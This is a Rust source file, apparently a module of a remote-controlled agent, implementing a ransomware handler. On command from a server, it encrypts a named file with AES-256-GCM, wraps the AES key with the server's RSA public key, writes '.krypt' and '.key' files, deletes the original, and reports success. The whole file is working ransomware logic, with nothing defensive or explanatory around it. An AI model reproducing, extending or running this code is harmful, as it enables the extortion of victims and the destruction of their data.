use std::{str::from_utf8, sync::Arc};

use aes_gcm::{aead::{AeadMut, OsRng}, AeadCore, Aes256Gcm, KeyInit};
use rsa::{BigUint, Pkcs1v15Encrypt, RsaPublicKey};
use shared::{encrypted_write_from_key, DataPacket};
use tokio::{fs, io::{AsyncReadExt, AsyncWriteExt}, net::tcp::OwnedWriteHalf, sync::{mpsc, Mutex}};

pub async fn ransom_handler(stream_write: Arc<Mutex<OwnedWriteHalf>>, stream_read: &mut mpsc::Receiver<Vec<u8>>, key: [u8; 32]) -> std::io::Result<()>{
    //-f = 0, -d = 1, -rd = 2, in the first byte when sending
    if let Some(data) = stream_read.recv().await {
        let encrypt_type = data[0];
        //TODO: change logic to accomodate each encryption type, currently only just encrypts one file

        let mut plaintext = vec![];
    
        let path = from_utf8(&data[1..]).map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidData, "couldnt convert bytes to a path"))?;
        println!("path string: {}", path);
    
        let mut original_file = fs::File::options().read(true).open(path).await?;
        original_file.read_to_end(&mut plaintext).await?;
    
        // request servers RSA public key
        let data = DataPacket {
            module_type: shared::ModuleType::RansomWare,
            data: vec![0u8]
        };
        encrypted_write_from_key(stream_write.clone(), &key, data).await?;
        let rsa_parts = stream_read.recv().await.ok_or(std::io::Error::new(std::io::ErrorKind::InvalidData, "couldnt recieve rsa parts"))?;
        let rsa_key = rsa_key_from_parts(rsa_parts)?;
        // generate AES key, iv and cipher for encrypting files
        let aes_key = Aes256Gcm::generate_key(OsRng);
        let iv = Aes256Gcm::generate_nonce(OsRng);
        let mut cipher = Aes256Gcm::new(&aes_key);
    
        // encrypt plaintext
        let ciphertext = cipher.encrypt(&iv, &plaintext[..]).map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidData, "couldnt encrypt plaintext"))?;
        //write iv and ciphertext to new file
        let encrypted_path = String::from(path) + ".krypt";
        let mut cipher_file = fs::File::options().create(true).write(true).open(encrypted_path).await?;
        cipher_file.write_all(&iv).await?;
        cipher_file.write_all(&ciphertext).await?;
        fs::remove_file(path).await?;

        //create file to write encrypted aes key to
        let keyfile_path = String::from(path) + ".key";
        let encryped_aes_key = rsa_key.encrypt(&mut OsRng, Pkcs1v15Encrypt, &aes_key).map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidData, "couldnt encrypt aes key"))?;
        let mut key_file = fs::File::options().create(true).write(true).open(keyfile_path).await?;
        key_file.write_all(&encryped_aes_key).await?;

        let data = DataPacket {
            module_type: shared::ModuleType::RansomWare,
            data: vec![0u8]
        };
        //send success message
        encrypted_write_from_key(stream_write.clone(), &key, data).await?;
        
        
    
    }

    
    Ok(())
}

fn rsa_key_from_parts(data: Vec<u8>) -> std::io::Result<RsaPublicKey> {
    let mut n_len = data[0] as usize;
    if n_len == 0 {
        n_len = 256
    }
    let n_bytes = &data[1..=n_len];
    let e_bytes = &data[n_len+1..];
    RsaPublicKey::new(BigUint::from_bytes_le(n_bytes), BigUint::from_bytes_le(e_bytes)).map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidData, "couldnt create public key"))


}